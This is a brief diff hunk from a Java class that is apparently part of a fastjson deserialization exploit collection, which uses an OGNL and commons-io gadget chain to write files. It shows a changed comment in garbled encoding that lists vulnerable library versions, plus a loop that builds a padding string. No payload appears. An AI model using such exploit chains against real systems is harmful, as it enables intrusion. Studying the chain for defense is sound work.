@@ -5,7 +5,7 @@ import com.alibaba.fastjson.JSON;
 
 public class Fastjson25_ognl_io_write_2 {
     public static void main(String[] args) throws Exception {
-        //“¿¿µ1.2.73-1.2.80 ognl-3.2.21  commons-io-2.7/2.8
+        //‰æùËµñ1.2.73-1.2.80 ognl-3.2.21  commons-io-2.7/2.8
     	String code = "test";
         for (int i = 0; i < 8200; i++) {
 			code += "a";
